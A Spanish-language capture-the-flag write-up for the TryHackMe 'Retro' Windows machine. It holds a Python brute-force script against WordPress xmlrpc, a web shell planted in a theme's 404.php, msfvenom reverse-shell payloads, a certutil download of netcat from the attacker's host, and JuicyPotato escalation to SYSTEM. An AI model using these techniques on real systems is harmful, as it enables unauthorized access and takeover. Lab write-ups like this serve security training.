## TryHackMe  <> Retro

![image](https://github.com/Esevka/CTF/assets/139042999/36badd10-cdc3-408e-becc-f3cd5791189e)

Enlace Maquina: https://tryhackme.com/room/retro

Enunciado : 

  - Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
  - There are two distinct paths that can be taken on Retro. 


## Escaneo de puertos

- Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/nmap]
      └─# nmap -p- --open -min-rate 5000 -n -Pn -vvv 10.10.173.211 -oN open_ports
   
      PORT     STATE SERVICE       REASON
      80/tcp   open  http          syn-ack ttl 127
      3389/tcp open  ms-wbt-server syn-ack ttl 127


    
      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/nmap]
      └─# nmap -p 80,3389 -sCV -n -Pn -vvv 10.10.173.211 -oN info_ports          
      
      PORT     STATE SERVICE       REASON          VERSION
      80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
      |_http-server-header: Microsoft-IIS/10.0
      |_http-title: IIS Windows Server
      | http-methods: 
      |   Supported Methods: OPTIONS TRACE GET HEAD POST
      |_  Potentially risky methods: TRACE
      
      3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
      | rdp-ntlm-info: 
      |   Target_Name: RETROWEB
      |   NetBIOS_Domain_Name: RETROWEB
      |   NetBIOS_Computer_Name: RETROWEB
      |   DNS_Domain_Name: RetroWeb
      |   DNS_Computer_Name: RetroWeb
      |   Product_Version: 10.0.14393
      |_  System_Time: 2023-09-16T05:43:45+00:00
      |_ssl-date: 2023-09-16T05:43:49+00:00; 0s from scanner time.
      | ssl-cert: Subject: commonName=RetroWeb
      | Issuer: commonName=RetroWeb
      | Public Key type: rsa
      | Public Key bits: 2048
      | Signature Algorithm: sha256WithRSAEncryption
      | Not valid before: 2023-09-15T05:35:16
      | Not valid after:  2024-03-16T05:35:16
      | MD5:   f400:b907:44a9:ca7b:859d:f10f:dc85:c9d9
      | SHA-1: 16b6:154a:ed2b:a480:79b1:6f3f:0794:22a6:e256:0f95
      | -----BEGIN CERTIFICATE-----
      | MIIC1DCCAbygAwIBAgIQUp4Y3citC59L5n1ZhsB4DTANBgkqhkiG9w0BAQsFADAT
      | MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMzA5MTUwNTM1MTZaFw0yNDAzMTYwNTM1
      | MTZaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
      | MIIBCgKCAQEAw+2LkrnvgtuOUHnlXrKEzjMUkTkrsOhyYWR3NtDvSC0dEoYR6156
      | i/+w1/8f2OwVwiKO75AY82/0woVqtLnrVsHiwJMExiGILkUbXerJ36lgPCqACpXM
      | gixEvJCxLWYjgkuBb8Kf5QoXSlaPeXWslhRdCzdrc8dvBgI6oh/gxf3ulzO2KQc1
      | sxuEeMAgMlOVg5HdGeD1o1DqN8yzyEFN7DEk1r5CqbC+L1bdmgewxVtlrGopvYRu
      | egLSd3VQ3oqt2zMKM0zZshhdn2KeIC0xAVcGjvYIEQLeSGa0i+PliNXrpXKVlG7+
      | tIWzXo4la4hdn9ySCrfpZk4h25zbwu9tEwIDAQABoyQwIjATBgNVHSUEDDAKBggr
      | BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAK3BBbozjsL0
      | yyp06iJVgTjohyLR2Egj3U4iAsSGOVH6GPqYumfuB5Hz01JwKM25+cEKg45Tu1+o
      | HhTsrLTBT2J1RUUeaH3BxR/I1O9BOWr7v2JGvyuhKfDNY6GmLq3JJQKAlrV263Ni
      | u5eQk+BIe9JJ0Nv9xkj81wYUkw1WwDrzLNnJCBcZ7TEOJeVJIFB0kMJZCTCnCi2G
      | z9urkeSCAMfl2P/VuLGqHcPQ4xpo84R/8JFunPleSiMbbweYQL3TKb1AioxmIqZ1
      | ydR4+d8c2iS0TnmioDif+Ay6zCRuoCRXt0zmfge5zFqm1jRAH366mkfmxjg9IF64
      | IUVYgw5cOQ4=
      |_-----END CERTIFICATE-----
      Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  - Puertos disponibles que tenemos para comprometer la maquina(Windows).
    
      -80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
    
      -3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services


## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

#### Puerto 80

-Cargamos la web y nos muestra muestra la tipica pantalla de Internet Information Service (IIS) la cual no tiene nada interesante.

![image](https://github.com/Esevka/CTF/assets/139042999/d8dd6ddb-29b5-4603-be06-ed259eebdb0d)

-Una de las preguntas de la maquina es --> What is the hidden directory which the website lives on?, por lo que vamos a fuzzear la web en busca de directorios.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/nmap]
    └─# gobuster dir -u http://10.10.173.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ../fuzz
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    
    /retro                (Status: 301) [Size: 150] [--> http://10.10.173.211/retro/] ------->
    /Retro                (Status: 301) [Size: 150] [--> http://10.10.173.211/Retro/] -------> ambas URL muestran lo mismo.

- Cargamos la url y efectivamente hay se encuentra la web oculta

   ![image](https://github.com/Esevka/CTF/assets/139042999/2e6e797e-19a4-4b85-85e8-49a3bfd804bb)

 - Analizamos la web en busca de informacion y encontramos lo siguiente.

   1) Revisando el codigo de la web

      - WordPress
      - Tema ---> /retro/wp-content/themes/90s-retro/

   2) Revisando la web

      - Usuario que postea ---> wade
        
        Comprobamos si es un usuario valido de WP
     
        ![image](https://github.com/Esevka/CTF/assets/139042999/43c12fba-25fa-4677-bc9c-2ed7ba9e5b95)

      - Comentario sospechoso, Probamos como passwd ----> parzival

        ![image](https://github.com/Esevka/CTF/assets/139042999/a31cf8cd-097e-4dc6-a9da-b748c88c2421)
        ![image](https://github.com/Esevka/CTF/assets/139042999/cc5312e5-28ae-4eb8-a078-8b3c6a6ffb6b)


      - Credenciales validas wade:parzival

        Nos podriamos conectar a la maquina para realizar su explotacion y postexplotacion con las credenciales obtenidas, son validas tanto para Wordpress como para conectaros por el servicio Terminal Server.
        
---
#### !Segun nos indica en el enunciado hay dos metodos para realizar esta maquina por lo que vamos a ver cuales son!
---

## Metodo1 - Wordpress.

-Si no econtramos la passwd revisando el contenido de la web, podemos realizar Brute Force contra el login de WP.

1) Comprobamos que WP tenga xmlrpc.php activo.

    ![image](https://github.com/Esevka/CTF/assets/139042999/d0860a63-1515-49a9-88af-e092e3bec1f1)

    INFO: https://www.hostinger.es/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/#%C2%BFQue_es_Xmlrpcphp
    
        XML-RPC es una característica de WordPress que permite que los datos se transmitan, con HTTP actuando
        como el mecanismo de transporte y XML como el mecanismo de codificación. Dado que WordPress no es un
        sistema encerrado en sí mismo y ocasionalmente necesita comunicarse con otros sistemas, la intención era
        realizar ese trabajo.
    
        Por ejemplo, supongamos que quisieras publicar en tu sitio desde tu dispositivo móvil ya que tu computadora
        no está cerca. Podrías usar la función de acceso remoto habilitada por xmlrpc.php para hacerlo.
   
2) Creamos un diccionario de claves basado en las palabras de la web, en el caso de que no funciones podriamos probar con rockyout.

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/script]
        └─# cewl http://10.10.188.22/retro -d 2 -w dic_baseweb.txt 
        CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

3) Creamos un script en python que nos automatize el ataque de Brute Froce contra el login de WP

        import requests
        import concurrent.futures
        
        flag = 0
        
        def brute_wp(passwd,usuario,url):
        
        	global flag
        
        	if flag != 1:
        
        		cookie = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
        		datos = """<?xml version="1.0" encoding="UTF-8"?>
        						<methodCall> 
        						<methodName>wp.getUsersBlogs</methodName> 
        						<params> 
        						<param><value>{}</value></param> 
        						<param><value>{}</value></param> 
        						</params> 
        						</methodCall>""".format(usuario,passwd)
        		
        		r = requests.post(url,data=datos,headers=cookie)
        
        		if r.headers.get('Content-Length') == '403':
        			if flag !=1:
        				print('[-]Pass NO --> {}'.format(passwd),end='\r')
        				print(end='\x1b[2K')
        		else:
        			print('[+]Pass SI -->{}'.format(passwd))
        			print('Finalizando tareas espere...')
        			flag = 1 
        			
        def main():
        
        	url = "http://10.10.135.197/retro/xmlrpc.php"
        	usuario = 'wade'
        
        	file = 'dic_baseweb.txt'
        
        	with open(file) as dic:
        		
        		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        			futures = []
        
        			for passwd in dic:
        				passwd = passwd.strip()
        				futures.append(executor.submit(brute_wp, passwd, usuario, url))
        
        
        			for futures in concurrent.futures.as_completed(futures):
        				if flag == 1:
        					executor.shutdown(wait=False,cancel_futures=True)
        					exit()
        
        if __name__=='__main__':
        	main()

4) Ejecutamos scrip y obtenemos credenciales

       ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/script]
       └─# python3 brute_wplogin.py 
       [+]Pass SI -->parzival
       Finalizando tareas espere...

     Credendiales validad para wordpress ----> wade:parzival

5) Logueamos en WP y obtenemos shell en la maquina victima.

   - Editamos el fichero 404.php del tema actual para poder obtener shell y ejecutar comandos desde la url del navegador.
       
      ![image](https://github.com/Esevka/CTF/assets/139042999/b4f7b7e7-df6f-43b8-914f-2f378b1f7687)

   - La jugada es la siguiente, subir netcat para que una vez obtengamos la shell poder upgradear y trabajar comodamente.

      - Creamos nuestra reverse shell y la copiamos al fichero 404.php
     
            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
            └─# msfvenom -p php/reverse_php LHOST=10.8.64.232 LPORT=1988 -f raw -o Rshell.exe
            [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
            [-] No arch selected, selecting arch: php from the payload
            No encoder specified, outputting raw payload
            Payload size: 2995 bytes
            Saved as: Rshell.exe
        
     - Codigo para poder ejecutar comandos desde la url del navegador, tenemos que copiarlo en el fichero 404.php
     
           system($_GET['cmd'];
  
     - Nos descargamos netcat x64 de la siguiente url -->  https://github.com/int0x33/nc.exe/
  
     - Montamos un servicio de datos http desde python para poder compartir dicho fichero.
  
            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
            └─# python3 -m http.server 80
            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
            10.10.7.22 - - [18/Sep/2023 17:42:22] "GET /nc64.exe HTTP/1.1" 200 -

     - Nos ponemos a la espera de nuestra conexion.
       
            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
            └─# rlwrap nc -lnvp 1988
            listening on [any] 1988 ...
       
     - Ejecutamos todo el proceso

         Comando que ejecutaremos desde la url para subir netcat --> certutil.exe -urlcache -f http://10.8.64.232/nc64.exe nc.exe

       ![image](https://github.com/Esevka/CTF/assets/139042999/008493d4-46b7-4b10-8a72-ea1f7e9840f4)

    - Hemos obtenido shell y subido netcat a la maquina victima

          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
          └─# rlwrap nc -lnvp 1988
          listening on [any] 1988 ...
          connect to [10.8.64.232] from (UNKNOWN) [10.10.7.22] 49938
          dir
           Volume in drive C has no label.
           Volume Serial Number is 7443-948C
          
           Directory of C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro
          
          09/18/2023  09:02 AM    <DIR>          .
          09/18/2023  09:02 AM    <DIR>          ..
          09/18/2023  08:46 AM             4,613 404.php
          12/08/2019  05:19 PM    <DIR>          languages
          09/18/2023  09:02 AM            45,272 nc.exe ---------> subida
          12/08/2019  05:19 PM             1,687 page.php

      - Upgrademos shell

        1) Nos ponemos nuevamente en escucha en nuestra maquina atacante

                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
                └─# nc -lnvp 1999
                listening on [any] 1999 ...
          
        3) Ejecutamos nc.exe en la maquina victima

           ![image](https://github.com/Esevka/CTF/assets/139042999/75f12a8f-568e-4b01-92b5-497b3c5e92c3)

        4) Obtenemos una son consola de windows operativa.

                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
                └─# nc -lnvp 1999
                listening on [any] 1999 ...
                connect to [10.8.64.232] from (UNKNOWN) [10.10.7.22] 49952
                Microsoft Windows [Version 10.0.14393]
                (c) 2016 Microsoft Corporation. All rights reserved.
                
                C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro>

-Obtenemos flag y elevamos privilegios.  

- En estos momentos tenemos acceso a la maquina como y no tenemos permisos par obtener ninguna flag.

      C:\Users>whoami
      whoami
      iis apppool\retro

      INFO: El IIS AppPool\ es una cuenta especial utilizada por el servicio de IIS (Internet Information Services) 
      en sistemas Windows para ejecutar aplicaciones web dentro de un "pool" de aplicaciones específico. 
      Los permisos de esta cuenta dependen de cómo esté configurada la seguridad en su servidor web y en su aplicación web.

- Verificamos los privilegios que tenemos como dicho usuario y vemos la informacion del sistema.

      C:\Users>whoami /priv
      whoami /priv
      
      PRIVILEGES INFORMATION
      ----------------------
      Privilege Name                Description                               State   
      ============================= ========================================= ========
      SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
      SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
      SeAuditPrivilege              Generate security audits                  Disabled
      SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
      SeImpersonatePrivilege        Impersonate a client after authentication Enabled ------> Bingo
      SeCreateGlobalPrivilege       Create global objects                     Enabled 
      SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

      C:\Users>systeminfo
      systeminfo
      
      Host Name:                 RETROWEB
      OS Name:                   Microsoft Windows Server 2016 Standard
      OS Version:                10.0.14393 N/A Build 14393
      OS Manufacturer:           Microsoft Corporation

  Segun la info obtenida podemos realizar un ataque con juicypotato para elevar privilegios y llegar a NT AUTHORITY\SYSTEM.
  SeImpersonatePrivilege – Windows Privilege Escalation --> https://juggernaut-sec.com/seimpersonateprivilege/

      INFO: El privilegio "SeImpersonatePrivilege" (o "Impersonate a client after authentication") es un privilegio de seguridad
      en sistemas Windows que permite a un proceso ejecutarse en el contexto de seguridad de un usuario o cliente después de autenticarse.
      En otras palabras, un proceso con este privilegio puede asumir la identidad de un usuario autenticado y realizar acciones en su nombre.

  1) Nos descargamos Juicypotato en nuestra maquina y montamos un servcio para compartilo com hemos hecho anteriormente.
 
     Descargar --> https://github.com/ohpe/juicy-potato/releases/tag/v0.1

  2) Nos descargamos juicypotato en la maquina victima.

     ![image](https://github.com/Esevka/CTF/assets/139042999/afe08ef0-ef9c-45a1-b490-38c9c93722a5)

          C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro>dir
           Volume in drive C has no label.
           Volume Serial Number is 7443-948C
          
           Directory of C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro
          
          09/18/2023  09:49 AM    <DIR>          .
          09/18/2023  09:49 AM    <DIR>          ..
          09/18/2023  08:46 AM             4,613 404.php
          12/08/2019  05:19 PM    <DIR>          js
          09/18/2023  09:49 AM           347,648 juicypotato.exe
          12/08/2019  05:19 PM    <DIR>          languages
          09/18/2023  09:02 AM            45,272 nc.exe

  3) Nos creamos una reverse shell que tenemos que subir a la maquina victima de la misma manera que hemos subido juicypotato.

          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
          └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.64.232 LPORT=2000 -f exe  -o Wshell.exe
          [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
          [-] No arch selected, selecting arch: x64 from the payload
          No encoder specified, outputting raw payload
          Payload size: 460 bytes
          Final size of exe file: 7168 bytes
          Saved as: Wshell.exe

  4) Ejecutamos el exploit y elevamos privilegios.
 
     Nos ponemos en escucha a la espera de la nueva conexion por el puerto 2000.
     Ejecutamos el exploit.

          C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro>juicypotato.exe -t * -p Wshell.exe -l 456
          juicypotato.exe -t * -p Wshell.exe -l 456
          Testing {4991d34b-80a1-4291-83b6-3328366b9097} 456
          ......
          [+] authresult 0
          {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
          
          [+] CreateProcessWithTokenW OK

      Obtenemos conexion como usuario nt authority\system(Administrador del SO), obtenemos flags.

          ──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
          └─# rlwrap nc -lnvp 2000
          listening on [any] 2000 ...
          connect to [10.8.64.232] from (UNKNOWN) [10.10.7.22] 50052
          Microsoft Windows [Version 10.0.14393]
          (c) 2016 Microsoft Corporation. All rights reserved.
          
          C:\Windows\system32>whoami
          whoami
          nt authority\system

         C:\Users\Wade\Desktop>type user.txt.txt
          type user.txt.txt
          3b99fbdc6d430b.......c651a261927

          C:\Users\Administrator\Desktop>type root.txt.txt
          type root.txt.txt
          7958b56956--------f22d1c4063

       

     

       

     
     
     
     



       


   

       


  
    
